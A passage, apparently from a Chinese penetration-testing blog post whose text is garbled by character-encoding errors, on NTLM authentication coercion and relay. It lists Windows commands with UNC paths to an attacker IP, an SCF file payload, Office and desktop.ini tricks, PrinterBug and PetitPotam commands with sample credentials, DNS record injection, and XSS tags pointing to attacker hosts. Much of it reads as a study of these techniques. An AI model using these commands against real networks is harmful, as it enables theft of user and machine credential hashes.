´è§£å¹¶è·å¾—å®¢æˆ·ç«¯ç”¨æˆ·çš„æ˜æ–‡å¯†ç ã€‚</p><p>è¿™é‡Œæœ‰å¦ä¸€ç§åˆ©ç”¨æ–¹æ³•ï¼Œ<strong>NTLM Relay</strong>ã€‚</p><p>NTLM Relayæ”»å‡»å°±æ˜¯é€šè¿‡ä¸­é—´äººå¯¹NTLMè®¤è¯è¿‡ç¨‹çš„æµé‡è¿›è¡Œè½¬å‘ï¼Œä»è€Œå…è®¸ä¸­é—´äººä½¿ç”¨å®¢æˆ·ç«¯çš„èº«ä»½è®¤è¯æœåŠ¡ï¼Œè¿‡ç¨‹å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="http://cdn.clown2024.cn/202407151446356.png" alt="image-20240517155502009"></p><p>è¦å®ç°è¯¥è¿‡ç¨‹ï¼Œè¦å…ˆè§£å†³å¦‚ä½•è§¦å‘å®¢æˆ·ç«¯å‘Attackerå‘èµ·NTLMè®¤è¯è¯·æ±‚ï¼Œå…¶æ¬¡è¦å†³å®šå°†å®¢æˆ·ç«¯çš„è¯·æ±‚æ‹¦æˆªåè®¤è¯åˆ°ä»€ä¹ˆæ ·çš„æœåŠ¡ã€‚</p><h1 id="å‘èµ·å¹¶æˆªè·ntlmè¯·æ±‚"><a href="#å‘èµ·å¹¶æˆªè·NTLMè¯·æ±‚" class="headerlink" title="å‘èµ·å¹¶æˆªè·NTLMè¯·æ±‚"></a>å‘èµ·å¹¶æˆªè·NTLMè¯·æ±‚</h1><p>NTLM æ˜¯ä¸€ç§åµŒå…¥å¼åè®®ï¼Œæ¶ˆæ¯çš„ä¼ è¾“ä¾èµ–ä½¿ç”¨ NTLM è¿›è¡Œè®¤è¯çš„ä¸Šå±‚åè®®ï¼Œå¦‚SMBã€LDAPã€HTTPã€MSSQL ç­‰ã€‚å› æ­¤ï¼Œåªè¦æ˜¯ä½¿ç”¨è¿™äº›åè®®çš„åº”ç”¨ç¨‹åºéƒ½å¯ä»¥è¦æ±‚ç”¨æˆ·å‘èµ· NTLM è¯·æ±‚ã€‚æµ‹è¯•äººå‘˜å¯é€šè¿‡ Responder ç­‰å·¥å…·å¯¹ç”¨æˆ·çš„ NTLM è®¤è¯è¯·æ±‚è¿›è¡Œæ‹¦æˆªï¼Œå¹¶è·å–å…¶ Net-NTLM Hashã€‚</p><p>Responder æ˜¯ä¸€æ¬¾å¯ä»¥åœ¨å±€åŸŸç½‘æ¨¡æ‹Ÿå„ç§æœåŠ¡å™¨(SMBã€LDAPã€HTTPã€MSSQLã€WPADã€FTPã€POP3ã€IMAPã€SMTP)è¿›è¡Œä¸­é—´äººæ”»å‡»çš„å·¥å…·ï¼Œå½“ç”¨æˆ·è¿æ¥è¿™äº›æœåŠ¡å™¨æ—¶ï¼Œè¯¥å·¥å…·å°†æˆªè·ç”¨æˆ·çš„è®¤è¯è¯·æ±‚ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="http://cdn.clown2024.cn/202407151446357.png" alt="image-20240517160601855"></p><p><img src="http://cdn.clown2024.cn/202407151446358.png" alt="image-20240517160627078"></p><blockquote><p>kaliä¸­å·²ç»é»˜è®¤å®‰è£…äº†responderå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œéœ€è¦rootæƒé™è¿è¡Œ</p></blockquote><h2 id="ntlmæ”»å‡»å¸¸ç”¨æ–¹æ³•"><a href="#NTLMæ”»å‡»å¸¸ç”¨æ–¹æ³•" class="headerlink" title="NTLMæ”»å‡»å¸¸ç”¨æ–¹æ³•"></a>NTLMæ”»å‡»å¸¸ç”¨æ–¹æ³•</h2><p>åœ¨Windowsä¸­ï¼Œé€šè¿‡è®¾ç½®æŒ‡å‘æ¶æ„æœåŠ¡å™¨çš„UNCè·¯å¾„ï¼Œèƒ½å¤Ÿä½¿å—å®³æœºå™¨è‡ªåŠ¨ä½¿ç”¨å½“å‰ç”¨æˆ·å‡­è¯å‘æ¶æ„æœåŠ¡å™¨å‘èµ·NTLMè®¤è¯</p><h3 id="ç³»ç»Ÿå‘½ä»¤"><a href="#ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="ç³»ç»Ÿå‘½ä»¤"></a>ç³»ç»Ÿå‘½ä»¤</h3><p>å¾ˆå¤šç³»ç»Ÿå‘½ä»¤éƒ½å¯ä»¥ä¼ å…¥UNCè·¯å¾„ï¼Œè¿™é‡Œåˆ—ä¸¾å¸¸ç”¨çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">net use \\10.10.10.147\share<br><span class="hljs-built_in">dir</span> \\10.10.10.147\share<br>attrib \\10.10.10.147\share<br>bcdboot \\10.10.10.147\share<br>bdeunlock \\10.10.10.147\share<br>cacls \\10.10.10.147\share<br>certreq \\10.10.10.147\share<br>certutil \\10.10.10.147\share<br>cipher \\10.10.10.147\share<br>ClipUp -l \\10.10.10.147\share<br>cmdl32 \\10.10.10.147\share<br>cmstp /s \\10.10.10.147\share<br>colorcpl \\10.10.10.147\share<br>comp /N=0 \\10.10.10.147\share<br>compact \\10.10.10.147\share<br>control \\10.10.10.147\share<br>Defrag \\10.10.10.147\share<br>diskperf \\10.10.10.147\share<br>dispdiag -out \\10.10.10.147\share<br>doskey /MACROFILE=\\10.10.10.147\share<br>esentutl /k \\10.10.10.147\share<br><span class="hljs-built_in">expand</span> \\10.10.10.147\share<br>extract32 \\10.10.10.147\share<br>FileHistory \\10.10.10.147\share<br>findstr * \\10.10.10.147\share<br>fontview \\10.10.10.147\share<br>fvenotify \\10.10.10.147\share<br>FXSCOVER \\10.10.10.147\share<br>hwrcomp -check \\10.10.10.147\share<br>hwrreg \\10.10.10.147\share<br>icacls \\10.10.10.147\share<br>licensingdiag -cab \\10.10.10.147\share<br>lodctr \\10.10.10.147\share<br>lpksetup /p \\10.10.10.147\share /s<br>makecab \\10.10.10.147\share<br>msiexec /update \\10.10.10.147\share /quiet<br>msinfo32 \\10.10.10.147\share<br>mspaint \\10.10.10.147\share<br>msra /openfile \\10.10.10.147\share<br>mstsc \\10.10.10.147\share<br>netcfg -l \\10.10.10.147\share -c p -i foo<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨net useå‘½ä»¤æ¥æµ‹è¯•ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151446359.png" alt="image-20240517162021631"></p><p><img src="http://cdn.clown2024.cn/202407151446360.png" alt="image-20240517162105436"></p><p>æˆ‘ä»¬è¿™é‡ŒæˆåŠŸæˆªè·åˆ°äº†Net-NTLM Hash v2</p><h3 id="desktopiniæ–‡ä»¶"><a href="#Desktop-iniæ–‡ä»¶" class="headerlink" title="Desktop.iniæ–‡ä»¶"></a>Desktop.iniæ–‡ä»¶</h3><p>Windowsç³»ç»Ÿæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ªéšè—æ–‡ä»¶ desktop.ini,ç”¨æ¥æŒ‡å®šå’Œå­˜å‚¨æ–‡ä»¶å¤¹å›¾æ ‡ä¹‹ç±»çš„ä¸ªæ€§åŒ–è®¾ç½®</p><p>å¦‚å›¾ï¼Œdesktop.iniä¸­çš„IconResourceä¸ºæ–‡ä»¶å¤¹çš„å›¾æ ‡è·¯å¾„ï¼Œå¯ä»¥æ”¹ä¸ºUNCè·¯å¾„å¹¶æŒ‡å‘æ¶æ„æœåŠ¡å™¨ã€‚å½“ç”¨æˆ·è®¿é—®è¯¥æ–‡ä»¶å¤¹æ—¶å°†è‡ªåŠ¨è¯·æ±‚æ¶æ„æœåŠ¡å™¨ä¸Šçš„å›¾æ ‡èµ„æºï¼ŒResponderå³å¯æˆªè·ç”¨æˆ·çš„Net-NTLM Hash</p><p><img src="http://cdn.clown2024.cn/202407151446361.png" alt="image-20240517163327639"></p><p><img src="http://cdn.clown2024.cn/202407151446362.png" alt="image-20240517163336432"></p><p><img src="http://cdn.clown2024.cn/202407151446363.png" alt="image-20240517163408543"></p><p>æˆ‘ä»¬æµ‹è¯•çš„æ—¶å€™å¯ä»¥æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç„¶åä¿®æ”¹æ”¹æ–‡ä»¶å¤¹ä¸ºéšä¾¿ä¸€ä¸ªå›¾æ ‡å°±ä¼šå‡ºç°desktop.iniæ–‡ä»¶ï¼Œç„¶åå°±å¯ä»¥ä¿®æ”¹äº†(è¦æŠŠéšè—é‡è¦ç³»ç»Ÿæ–‡ä»¶å…³æ‰æ‰ä¼šå‡ºç°)</p><blockquote><p>æˆ‘è‡ªå·±æµ‹è¯•çš„æ—¶å€™å¤ç°å¤±è´¥äº†ä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p></blockquote><h3 id="scfæ–‡ä»¶"><a href="#SCFæ–‡ä»¶" class="headerlink" title="SCFæ–‡ä»¶"></a>SCFæ–‡ä»¶</h3><p>SCF æ–‡ä»¶æ˜¯ Windows æ–‡ä»¶èµ„æºç®¡ç†å™¨å‘½ä»¤æ–‡ä»¶ï¼Œä¹Ÿæ˜¯ä¸€ç§å¯æ‰§è¡Œæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶ä¸­çš„IconFile å±æ€§å¯ä»¥æŒ‡å®š UNC è·¯å¾„ï¼ŒWindows æ–‡ä»¶èµ„æºç®¡ç†å™¨å°†å°è¯•åŠ è½½ IconFile å±æ€§æŒ‡å®šçš„æ–‡ä»¶å›¾æ ‡ã€‚</p><p>åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ªtest.scfæ–‡ä»¶ï¼Œå†™å…¥ä¸‹é¢å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[Shell]<br>Command=2<br>IconFile=\\192.168.20.128\share\test.ico<br>[Taskbar]<br>Command=TogleDesktop<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®æ–‡ä»¶å¤¹å³å¯æˆªè·</p><blockquote><p>è¿™é‡Œä¹Ÿå¤ç°å¤±è´¥äº†å¥‡æ€ªäº†</p></blockquote><h3 id="pdfæ–‡ä»¶"><a href="#PDFæ–‡ä»¶" class="headerlink" title="PDFæ–‡ä»¶"></a>PDFæ–‡ä»¶</h3><p>PDF è§„èŒƒå…è®¸ä¸º GoTobe å’Œ GoTORæ¡ç›®åŠ è½½è¿œç¨‹å†…å®¹ã€‚æµ‹è¯•äººå‘˜å¯ä»¥åœ¨ PDF æ–‡ä»¶ä¸­æ’å…¥ UNC è·¯å¾„ï¼Œå½“ç”¨æˆ·é€šè¿‡ PDF é˜…è¯»å™¨(Adobe Reader)æ‰“å¼€ PDF æ–‡æ¡£æ—¶ï¼Œå°†å‘æ¶æ„æœåŠ¡å™¨å‘èµ· NTLM è®¤è¯è¯·æ±‚ã€‚</p><p>ç›¸å…³åˆ©ç”¨å·¥å…·æœ‰Bad-PDFå’ŒWorse-PDF</p><p>ä»¥badpdfä¸ºä¾‹</p><p><img src="http://cdn.clown2024.cn/202407151446364.png" alt="image-20240517174014128"></p><p>ç„¶åå°†ç”Ÿæˆçš„test.pdfä¸Šä¼ åˆ°å—å®³æœºï¼Œç”¨Adobe Readeræ‰“å¼€æ–‡ä»¶åï¼Œè€Œå·²æœåŠ¡å™¨å°±ä¼šæˆªè·ç”¨æˆ·çš„Net-NTLM Hashã€‚emmmä½†æ˜¯æ„Ÿè§‰é€‚ç”¨é¢æœ‰ç‚¹çª„ï¼Œåªæœ‰Adobe Readeræ‰“å¼€æ‰å‘èµ·NTLMè¯·æ±‚ï¼Œæ­£å¸¸æµè§ˆå™¨æ‰“å¼€æ— äº‹å‘ç”Ÿã€‚</p><p>è€Œä¸”å¤šå¹´å‰å°±å‡ºç°è¡¥ä¸äº†æ„Ÿè§‰åŸºæœ¬æ²¡ç”¨äº†å±äºæ˜¯</p><h3 id="officeæ–‡æ¡£"><a href="#Officeæ–‡æ¡£" class="headerlink" title="Officeæ–‡æ¡£"></a>Officeæ–‡æ¡£</h3><p>Office æ–‡æ¡£çš„ document.xml.rels æ–‡ä»¶å¯ä»¥æ’å…¥ UNC è·¯å¾„ï¼Œå¹¶å‘ UNC åœ°å€æŒ‡å®šçš„æœåŠ¡å™¨å‘èµ· NTLM è¯·æ±‚ã€‚</p><p>åˆ¶ä½œæµç¨‹å¦‚ä¸‹ï¼š</p><ol><li><p>æ–°å»ºä¸€ä¸ªWordæ–‡æ¡£ï¼Œä»»æ„æ’å…¥ä¸€å¼ å›¾ç‰‡åä¿å­˜ï¼Œç”¨å‹ç¼©è½¯ä»¶æ‰“å¼€</p></li><li><p>åœ¨word&#x2F;_relsä¸‹æ‰¾åˆ°document.xml.relsæ–‡ä»¶ï¼Œæ‰¾åˆ°åˆšæ‰æ’å…¥å›¾ç‰‡å¯¹åº”çš„Targetå‚æ•°ï¼Œå°†å…¶ä¿®æ”¹ä¸ºæŒ‡å‘è€Œå·²æœåŠ¡å™¨çš„UNCè·¯å¾„ï¼Œå¹¶åŠ ä¸ŠTargetMode&#x3D;â€Externalâ€å±æ€§</p><p><img src="http://cdn.clown2024.cn/202407151446365.png" alt="image-20240517175701097"></p><p><img src="http://cdn.clown2024.cn/202407151446366.png" alt="image-20240517175820073"></p></li><li><p>å°†è¯¥æ–‡ä»¶ä¸Šä¼ åˆ°å—å®³æœºå™¨ï¼Œæ–‡ä»¶è¢«æ‰“å¼€åå°±å¯ä»¥æˆªè·åˆ°Net-NTLM Hash</p></li></ol><blockquote><p>éš¾ç»·åˆå¤ç°å¤±è´¥äº†ã€‚ã€‚ã€‚ä¸çŸ¥é“æ˜¯ä¸æ˜¯åªé€‚åˆæ—§ç‰ˆæœ¬çš„office</p></blockquote><h3 id="privexchangeæ¼æ´"><a href="#PrivExchangeæ¼æ´" class="headerlink" title="PrivExchangeæ¼æ´"></a>PrivExchangeæ¼æ´</h3><p>Microsoft Exchange å…è®¸ä»»æ„å…³è”äº†Exchange é‚®ç®±çš„ç”¨æˆ·é€šè¿‡EWSæ¥å£æ¥åˆ›å»ºä¸€ä¸ªæ¨é€è®¢é˜…(Push Subscription)ï¼Œå¹¶å¯ä»¥æŒ‡å®šä»»æ„ URL ä½œä¸ºé€šçŸ¥æ¨é€çš„ç›®çš„åœ°ã€‚</p><p>å½“è§¦å‘é€šçŸ¥æ¨é€æ—¶ï¼ŒExchange å°†ä½¿ç”¨ CredentialCache.DefaultCredentials å‘å‡º HTTP è¯·æ±‚ï¼Œå¹¶ä»¥æœºå™¨è´¦æˆ·çš„èº«ä»½å‘èµ· NTLM è®¤è¯ã€‚è¯¥æ¼æ´æœ¬è´¨æ˜¯ä¸€ä¸ª SSRFã€‚</p><p>å…·ä½“çš„ä½¿ç”¨å¯ä»¥ç½‘ä¸Šæ‰¾POCéªŒè¯ã€‚</p><h3 id="printerbugæ¼æ´"><a href="#PrinterBugæ¼æ´" class="headerlink" title="PrinterBugæ¼æ´"></a>PrinterBugæ¼æ´</h3><p>Windows ä¸­çš„MS-RPRN(Print System Remote Protocolï¼Œæ‰“å°ç³»ç»Ÿè¿œç¨‹åè®®)ç”¨äºæ‰“å°å®¢æˆ·ç«¯å’Œæ‰“å°æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œæ”¯æŒå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„åŒæ­¥æ‰“å°å’Œè”æœºæ“ä½œåŒ…æ‹¬æ‰“å°ä»»åŠ¡æ§åˆ¶ã€æ‰“å°ç³»ç»Ÿç®¡ç†ã€‚</p><p>MS-RPRN ä¸­å®šä¹‰çš„RpcRemoteFindFirstPrinterChangeNotification APIå¯ä»¥åˆ›å»ºè¿œç¨‹ä¿®æ”¹é€šçŸ¥å¯¹è±¡ï¼Œç”¨äºç›‘æ§å¯¹æ‰“å°æœºå¯¹è±¡çš„ä¿®æ”¹ï¼Œå¹¶å‘æ‰“å°å®¢æˆ·ç«¯å‘é€ä¿®æ”¹é€šçŸ¥ã€‚ä»»ä½•å…·å¤‡åŸŸç”¨æˆ·æƒé™çš„æµ‹è¯•äººå‘˜éƒ½å¯ä»¥æ»¥ç”¨è¯¥æ–¹æ³•æ¥å¼ºè¿«è¿è¡Œæ‰“å°æœåŠ¡(PrintSpooler)çš„ä¸»æœºå‘æ¶æ„æœåŠ¡å™¨å‘èµ· Kerberos æˆ– NTLM èº«ä»½è®¤è¯è¯·æ±‚ã€‚å¹¶ä¸”ï¼Œç”±äº Print Spooler æœåŠ¡ä»¥NTAUTHORITY\SYSTEM è´¦æˆ·çš„èº«ä»½è¿è¡Œ,å› æ­¤æœ€ç»ˆé€šè¿‡ Responder æˆªè·çš„æ˜¯ç›®æ ‡æœºå™¨è´¦æˆ·çš„ Net-NTMLHashã€‚å¾®è½¯å¹¶ä¸æ‰¿è®¤è¿™æ˜¯ä¸€ä¸ªæ´ï¼Œæ‰€ä»¥æœªè¿›è¡Œä»»ä½•ä¿®å¤ã€‚</p><p>ç›¸å…³åˆ©ç”¨å·¥å…·æœ‰SpoolSample.exeå’ŒPrinterbug.pyï¼Œå¼€å¯Responderç›‘å¬åï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python printerbug.py hack-my.com/Marcus:Marcus\@123@10.10.10.20 10.10.10.147<br></code></pre></td></tr></table></figure><p>é€šè¿‡ printerbugÂ·py è¿æ¥åˆ°å—å®³æœºå™¨(10.10.10.20)ï¼Œä»¥è¿«ä½¿å®ƒå‘æµ‹è¯•äººå‘˜æ‰€æ§çš„æ¶æ„æœåŠ¡å™¨(10.10.10.147)å‘èµ· NTLM è®¤è¯ã€‚Responder ä¸ŠæˆåŠŸæˆªè·å—å®³æœºå™¨çš„ Net-NTML Hash</p><p><img src="http://cdn.clown2024.cn/202407151446367.png" alt="image-20240517183241095"></p><h3 id="petitpotamæ¼æ´"><a href="#PetitPotamæ¼æ´" class="headerlink" title="PetitPotamæ¼æ´"></a>PetitPotamæ¼æ´</h3><p>å½“Print SpooleræœåŠ¡è¢«å…³é—­åï¼ŒPrinterBugæ¼æ´å°±æ— æ³•åˆ©ç”¨ï¼Œè¯¥æ¼æ´å¯ä»¥ç”¨äºæ›¿ä»£PrinterBugæ–¹æ³•ã€‚</p><p>MS-EFSRä¸­æœ‰ä¸€ç»„APIï¼Œå¯é€šè¿‡FileNameå‚æ•°æŒ‡å®šUNC è·¯å¾„ã€‚ä¾‹å¦‚ï¼ŒEfsRpcOpenFileRaw APIçš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼Œå¯ä»¥æ‰“å¼€æœåŠ¡å™¨ä¸Šçš„åŠ å¯†å¯¹è±¡è¿›è¡Œå¤‡ä»½æˆ–è¿˜åŸã€‚</p><p><img src="http://cdn.clown2024.cn/202407151446369.png" alt="image-20240517183953529"></p><p>PetitPotamå°±æ˜¯é€šè¿‡åˆ©ç”¨è¿™äº›APIæ¥å‘æ¶æ„æœåŠ¡å™¨å‘èµ·NTLMè®¤è¯è¯·æ±‚ï¼Œç„¶åæˆªè·Net-NTLM Hash</p><p>ä¸PrinterBugä¸€æ ·ï¼ŒPetitPotamä¹Ÿéœ€è¦æœ‰ä¸€ä¸ªåŸŸç”¨æˆ·æƒé™ã€‚</p><p>æ³¨æ„ï¼Œåœ¨ Windows Server 2008&#x2F;2012 ä¸Šï¼Œç”±äºå¯åŒ¿åè®¿é—®çš„å‘½åç®¡é“é»˜è®¤ä¸ä¸ºç©ºï¼Œå› æ­¤å¯¼è‡´å¯ä»¥åŒ¿åè§¦å‘ã€‚</p><p>å¼€å¯ç›‘å¬æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python PetitPotam.py -d hack-my.com -u Marcus -p Marcus\@123 10.10.10.147 10.10.10.20<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151446370.png" alt="image-20240517184536531"></p><h2 id="å¸¸è§webæ¼æ´åˆ©ç”¨"><a href="#å¸¸è§Webæ¼æ´åˆ©ç”¨" class="headerlink" title="å¸¸è§Webæ¼æ´åˆ©ç”¨"></a>å¸¸è§Webæ¼æ´åˆ©ç”¨</h2><h3 id="xss"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p><strong>æ„é€ UNCè·¯å¾„ï¼Œè§¦å‘SMBè¯·æ±‚å¹¶å‘æ¶æ„æœåŠ¡å™¨å‘èµ·NTLMè®¤è¯</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"># ä½¿ç”¨äº<span class="hljs-variable constant_">IE</span>æµè§ˆå™¨<br>&lt;scripts src=<span class="hljs-string">&quot;\\10.10.10.147\xss&quot;</span>&gt;&lt;/script&gt;<br># å€ŸåŠ©<span class="hljs-variable constant_">LLMNR</span>/<span class="hljs-variable constant_">NBNS</span>ï¼Œé€‚ç”¨äº<span class="hljs-variable constant_">IE</span>å’Œ<span class="hljs-title class_">Edge</span>æµè§ˆå™¨<br>&lt;scripts src=<span class="hljs-string">&quot;\\UnknownName\xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><blockquote><p>LLMNRï¼ˆLink-Local Multicast Name Resolutionï¼‰å’ŒNBNSï¼ˆNetBIOS Name Serviceï¼‰æ˜¯ä¸¤ç§ç½‘ç»œæœåŠ¡åè®®ï¼Œå®ƒä»¬ç”¨äºåœ¨å±€åŸŸç½‘ï¼ˆLANï¼‰ä¸­è§£æä¸»æœºååˆ°IPåœ°å€ã€‚</p></blockquote><ul><li><p>LLMNRæ˜¯å¾®è½¯å¼€å‘çš„ä¸€ä¸ªåŸºäºIPv6çš„åç§°è§£ææœåŠ¡ï¼Œç”¨äºåœ¨æ²¡æœ‰DNSæœåŠ¡å™¨çš„æƒ…å†µä¸‹è§£ææœ¬åœ°ç½‘ç»œä¸Šçš„ä¸»æœºåã€‚</p></li><li><p>å®ƒä½¿ç”¨IPv6çš„é“¾è·¯æœ¬åœ°åœ°å€ä½œä¸ºé€šä¿¡åª’ä»‹ï¼Œé€šè¿‡å‘é€å¤šæ’­æ¶ˆæ¯æ¥è§£æä¸»æœºåã€‚</p></li><li><p>LLMNRé€šå¸¸ç”¨äºå°å‹ç½‘ç»œæˆ–å®¶åº­ç½‘ç»œï¼Œå…¶ä¸­å¯èƒ½æ²¡æœ‰é…ç½®DNSæœåŠ¡å™¨ã€‚</p></li><li><p>NBNSæ˜¯NetBIOSï¼ˆNetwork Basic Input&#x2F;Output Systemï¼‰åç§°æœåŠ¡çš„ç¼©å†™ï¼Œæ˜¯æ—©æœŸWindowsç½‘ç»œä¸­ç”¨äºåç§°è§£æçš„ä¸€ä¸ªæœåŠ¡ã€‚</p></li><li><p>NBNSä½¿ç”¨NetBIOSåè®®ï¼Œé€šè¿‡å¹¿æ’­æˆ–å¤šæ’­æ¶ˆæ¯æ¥è§£æç½‘ç»œä¸Šçš„NetBIOSåç§°åˆ°IPåœ°å€ã€‚</p></li><li><p>NBNSä¸»è¦ç”¨äºåŸºäºNetBIOSçš„ç½‘ç»œï¼Œå¦‚Windows NTå’Œæ—©æœŸçš„Windowsç‰ˆæœ¬ã€‚</p></li></ul><p><strong>æ„é€ httpè·¯å¾„ï¼Œé€šè¿‡httpå‘æ¶æ„æœåŠ¡å™¨å‘èµ·NTLMè®¤è¯è¯·æ±‚</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">&lt;scripts src=<span class="hljs-string">&quot;//10.10.10.147/xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>åœ¨Microsoft Edgeç­‰æµè§ˆå™¨ä¸­å­˜åœ¨ä¿¡ä»»åŒºåŸŸ(Trusted Zones)ï¼Œå…¶ä¸­åŒ…æ‹¬äº’è”ç½‘(Internet)ã€æœ¬åœ°å†…éƒ¨ç½‘(Local Internet)ã€å—ä¿¡ä»»çš„ç«™ç‚¹(Trusted Sites)å’Œå—é™åˆ¶çš„ç«™ç‚¹(Restricted Sites)è¿™å‡ ä¸ªåŒºåŸŸ</p><p><img src="http://cdn.clown2024.cn/202407151446371.png" alt="image-20240528233328349"></p><p>æ¯ä¸ªåŒºåŸŸéƒ½å¯¹åº”ä¸åŒçš„å®‰å…¨ç­‰çº§ï¼Œå¹¶å…³è”ä¸åŒçš„é™åˆ¶æ¡ä»¶ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰å½“æŸç«™ç‚¹çš„åŸŸååœ¨æœ¬åœ°å†…éƒ¨ç½‘(Local Intranet)æˆ–å—ä¿¡ä»»çš„ç«™ç‚¹(Trusted Sites)åˆ—è¡¨ä¸­æ—¶ï¼Œæµè§ˆå™¨æ‰ä¼šè‡ªåŠ¨ä½¿ç”¨å½“å‰è®¡ç®—æœºå·²ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡ŒNTLM è®¤è¯ï¼›å…¶ä½™æƒ…å†µéƒ½éœ€è¦ç”¨æˆ·æ‰‹åŠ¨è¾“å…¥èº«ä»½è¿›è¡ŒéªŒè¯ã€‚</p><p>é€šå¸¸ï¼Œè®¸å¤šç»„ç»‡å°†ä¼ä¸šå­åŸŸåæ‰€æ‰˜ç®¡çš„æ‰€æœ‰æ•°æ®æ ‡è®°ä¸ºå¯ä¿¡æ•°æ®ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151446372.png" alt="image-20240528233641528"></p><p>*.hack-my.com ä½äºç™½åå•ä¸­ï¼Œé‚£ä¹ˆæµ‹è¯•äººå‘˜åªéœ€è¦è·å–*.hack-my.com ä¸‹çš„æŸå°æœåŠ¡å™¨ä½¿ç”¨è¯¥æœåŠ¡å™¨å¯åŠ¨ Responder ç›‘å¬ï¼Œå°±å¯ä»¥è®©æµè§ˆå™¨è‡ªåŠ¨ä»¥ç™»å½•ç”¨æˆ·çš„å‡­æ®å‘èµ· NTLMè®¤è¯</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥Powermadé¡¹ç›®çš„Invoke-DNSUpdate.ps1è„šæœ¬å¯ç”¨æ¥å‘åŸŸå†…æ·»åŠ ä¸€æ¡æ–°çš„ DNS è®°å½•ï¼Œç”±äºåŸŸå†…çš„æˆå‘˜é»˜è®¤å…·æœ‰æ·»åŠ  DNS çš„æƒé™ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è¯¥è„šæœ¬ä¸ºè¿è¡Œ Responder çš„æœåŠ¡å™¨æ³¨å†Œä¸€ä¸ªå­åŸŸåï¼Œå¦‚evil.hack-my.com</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Import-Module .ã€InvokeDNSUpdate.ps1<br>Invoke-DNSUpdate -DNSType A -DNSName evil.hack-my.com -DNSData 10.10.10.147<br></code></pre></td></tr></table></figure><p>ç„¶åxssæ”»å‡»å‘é‡ä¿®æ”¹æˆè¿™æ ·å³å¯æˆªè·NTLMè®¤è¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">&lt;scripts src=<span class="hljs-string">&quot;//evil.hack-my.com/xss&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="file-inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>åœ¨ Windows ä¸‹ï¼ŒPHP çš„å¸¸è§æ–‡ä»¶åŒ…å«æ–‡ä»¶è¯»å–ç±»å‡½æ•°ï¼Œå¯ä»¥è§£æ UNC ç½‘ç»œè·¯å¾„</p><p>å¦‚æœç½‘ç«™å­˜åœ¨ XXEã€SSRF ç­‰æ¼æ´ï¼Œéƒ½å¯ä»¥é€šè¿‡æŒ‡å®šç½‘ç»œè·¯å¾„(UNC æˆ– HTTP)ï¼Œå°è¯•è§¦å‘ NTLM è¯·æ±‚ã€‚</p><h3 id="sqlæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p>åœ¨ Windows ä¸‹å®‰è£…çš„ MySQL æ•°æ®åº“ä¸­ï¼Œload_fileã€into dumpfileç­‰å¸¸è§æ“ä½œå‡æ”¯æŒUNC è·¯å¾„</p><p><img src="http://cdn.clown2024.cn/202407151446373.png" alt="image-20240528234420733"></p><p>mysqlçš„å‰ææ˜¯è¦æ‹¥æœ‰ç›¸å…³æ“ä½œçš„æƒé™ï¼Œå¹¶ä¸”æ²¡æœ‰secure_file_privçš„é™åˆ¶</p><p>å¯¹åº”SQL Serveræ•°æ®åº“ï¼Œé€šè¿‡è°ƒç”¨xp_dirtreeç­‰å­˜å‚¨è¿‡ç¨‹å¯ä»¥å‘èµ·NTLMè¯·æ±‚ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151446374.png" alt="image-20240528234602866"></p><h2 id="llmnrx2fnbnsæ¬ºéª—åˆ©ç”¨"><a href="#LLMNR-NBNSæ¬ºéª—åˆ©ç”¨" class="headerlink" title="LLMNR&#x2F;NBNSæ¬ºéª—åˆ©ç”¨"></a>LLMNR&#x2F;NBNSæ¬ºéª—åˆ©ç”¨</h2><p>LLMNR(Link-Local Multicast Name Resolution,é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æ)æ˜¯ä¸€ä¸ªåŸºäºåè®®çš„åŸŸåç³»ç»Ÿ(DNS)æ•°æ®åŒ…çš„æ ¼å¼ï¼ŒIPv4å’ŒIPv6çš„ä¸»æœºå¯ä»¥é€šè¿‡æ­¤åè®®å¯¹åŒä¸€æœ¬åœ°é“¾è·¯ä¸Šçš„ä¸»æœºæ‰§è¡Œåç§°è§£æã€‚</p><p>NBNS çš„å…¨ç§°ä¸º 